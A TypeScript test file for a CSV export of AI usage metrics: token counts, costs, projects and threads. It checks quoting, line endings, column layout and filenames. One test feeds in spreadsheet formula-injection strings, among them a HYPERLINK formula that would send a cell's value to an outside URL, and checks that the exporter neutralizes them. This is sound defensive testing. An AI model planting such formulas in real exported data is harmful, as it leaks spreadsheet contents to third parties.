import type { ProjectId, UsageMetrics, UsageSummary } from "@t3tools/contracts";
import { describe, expect, it } from "vitest";

import { csvField, toCsv, usageCsv, usageCsvFilename } from "./usageCsv";

const metrics = (overrides: Partial<UsageMetrics> = {}): UsageMetrics => ({
  turnCount: 2,
  reportedTokenTurnCount: 2,
  inputTokens: 100,
  outputTokens: 20,
  cacheReadTokens: 5,
  cacheWriteTokens: 1,
  totalTokens: 120,
  providerReportedCostUsd: 0.5,
  pricedTurnCount: 2,
  unpricedTurnCount: 0,
  reporting: null,
  ...overrides,
});

const summary = {
  buckets: [
    {
      key: "2026-11-07",
      label: "Nov 7",
      startAt: "2026-11-07T00:00:00.000Z",
      endAt: "2026-11-08T00:00:00.000Z",
      metrics: metrics(),
      composition: null,
    },
  ],
  byProvider: [
    {
      provider: "codex",
      model: 'gpt "five", six',
      metrics: metrics({ providerReportedCostUsd: null, pricedTurnCount: 0, unpricedTurnCount: 2 }),
    },
  ],
  projectScope: {
    selectedProjectId: null,
    byProject: [
      { projectId: "p1", title: null, deleted: false, metrics: metrics() },
      { projectId: null, title: null, deleted: false, metrics: metrics() },
    ],
    topThreads: [
      { threadId: "t1", projectId: "p1", title: null, deleted: true, metrics: metrics() },
    ],
    threadCount: 1,
  },
} as unknown as UsageSummary;

const projectName = (_projectId: ProjectId, title: string | null) => title ?? "Alpha";

describe("csvField", () => {
  it("quotes commas, quotes and line breaks per RFC 4180", () => {
    expect(csvField("plain")).toBe("plain");
    expect(csvField('a "b", c')).toBe('"a ""b"", c"');
    expect(csvField("line\nbreak")).toBe('"line\nbreak"');
    expect(csvField(null)).toBe("");
    expect(csvField(0)).toBe("0");
  });

  it("defuses text a spreadsheet would run as a formula and keeps numbers raw", () => {
    expect(csvField('=HYPERLINK("https://x/?"&A1,"x")')).toBe(
      `"'=HYPERLINK(""https://x/?""&A1,""x"")"`,
    );
    expect(csvField("+1")).toBe("'+1");
    expect(csvField("-cmd")).toBe("'-cmd");
    expect(csvField("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvField("\tx")).toBe("'\tx");
    expect(csvField("\rx")).toBe(`"'\rx"`);
    expect(csvField("a=b")).toBe("a=b");
    expect(csvField(-2.5)).toBe("-2.5");
  });

  it("joins rows with CRLF and ends with one", () => {
    expect(toCsv(["a", "b"], [[1, null]])).toBe("a,b\r\n1,\r\n");
  });
});

describe("usageCsv", () => {
  it("writes bucket rows with ISO bounds and raw numbers", () => {
    const [header, row] = usageCsv(summary, "over-time", projectName).split("\r\n");
    expect(header).toBe(
      "interval_start,interval_end,recorded_turns,total_tokens,input_tokens,output_tokens,cache_read_tokens,cache_write_tokens,cost_usd,unpriced_turns",
    );
    expect(row).toBe("2026-11-07T00:00:00.000Z,2026-11-08T00:00:00.000Z,2,120,100,20,5,1,0.5,0");
  });

  it("leaves an unknown cost empty and quotes model names", () => {
    const row = usageCsv(summary, "models", projectName).split("\r\n")[1];
    expect(row).toBe('Codex,"gpt ""five"", six",2,120,100,20,5,1,,2');
  });

  it("names projects and threads", () => {
    const projects = usageCsv(summary, "projects", projectName).split("\r\n");
    expect(projects[1]).toMatch(/^p1,Alpha,false,/);
    expect(projects[2]).toMatch(/^,Unattributed historical cost,false,/);
    const threads = usageCsv(summary, "threads", projectName).split("\r\n");
    expect(threads[1]).toMatch(/^t1,Untitled thread,p1,true,/);
  });
});

describe("usageCsvFilename", () => {
  it("includes range, kind and the local date", () => {
    expect(usageCsvFilename("7d", "models", new Date(2026, 10, 8, 23, 30))).toBe(
      "f5-usage-7d-models-2026-11-08.csv",
    );
  });
});
